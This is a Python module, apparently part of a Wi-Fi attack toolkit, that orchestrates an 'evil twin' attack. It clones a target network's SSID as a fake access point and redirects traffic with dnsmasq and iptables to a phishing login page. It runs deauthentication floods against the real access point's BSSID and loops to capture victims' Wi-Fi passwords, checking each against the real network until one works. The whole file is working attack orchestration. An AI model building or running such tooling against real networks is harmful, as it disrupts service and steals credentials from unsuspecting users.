# attack/evil_twin/manager.py

import threading
import time

from . import hostapd
from . import dnsmasq
from . import iptables
from . import deauth
from . import webserver
from . import validator

class EvilTwinAttack:
    def __init__(self, target_ssid, target_bssid, iface_hostapd, iface_deauth):
        """
        :param target_ssid: SSID des echten APs (für Fake AP)
        :param target_bssid: MAC des echten APs (für Deauth)
        :param iface_hostapd: WLAN-Interface für Fake AP
        :param iface_deauth: WLAN-Interface für Deauth-Angriffe
        """
        self.target_ssid = target_ssid
        self.target_bssid = target_bssid
        self.iface_hostapd = iface_hostapd
        self.iface_deauth = iface_deauth

        # Status-Flag
        self.running = False

        # Threads (Webserver, Deauth)
        self.webserver_thread = None
        self.deauth_thread = None

        # Komponenten initialisieren
        self.hostapd = hostapd.HostapdManager(self.target_ssid, self.iface_hostapd)
        self.dnsmasq = dnsmasq.DnsmasqManager(self.iface_hostapd)
        self.iptables = iptables.IptablesManager(self.iface_hostapd)
        self.deauth = deauth.DeauthManager(self.target_bssid, self.iface_deauth)
        self.webserver = webserver.WebserverManager()
        self.validator = validator.Validator(self.iface_hostapd)

    def start(self):
        print("[*] Starte Evil Twin Attack ...")
        self.running = True

        # 1. Fake AP starten
        self.hostapd.start()

        # 2. DHCP & DNS starten
        self.dnsmasq.start()

        # 3. IP-Tables Regeln setzen (redirects)
        self.iptables.setup()

        # 4. Webserver starten (für Login Page)
        self.webserver_thread = threading.Thread(target=self.webserver.run, daemon=True)
        self.webserver_thread.start()

        # 5. Deauth-Angriff starten
        self.deauth_thread = threading.Thread(target=self.deauth.run, daemon=True)
        self.deauth_thread.start()

        # 6. Main Loop, z.B. um Passwort-Validierung zu triggern
        try:
            while self.running:
                # Prüfe evtl. neue Passwortversuche
                pw = self.webserver.get_last_password_attempt()
                if pw:
                    print(f"[*] Passwortversuch erhalten: {pw}")

                    # Passwort prüfen
                    valid = self.validator.check_password(pw)
                    if valid:
                        print("[+] Passwort korrekt! Beende Evil Twin Attack.")
                        self.stop()
                    else:
                        print("[-] Passwort falsch, bitte erneut versuchen.")
                        self.webserver.notify_invalid_password()
                time.sleep(2)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        print("[*] Stoppe Evil Twin Attack ...")
        self.running = False
        # Stoppe alle Komponenten sauber
        self.hostapd.stop()
        self.dnsmasq.stop()
        self.iptables.cleanup()
        self.deauth.stop()
        self.webserver.stop()

        print("[*] Alle Komponenten gestoppt.")
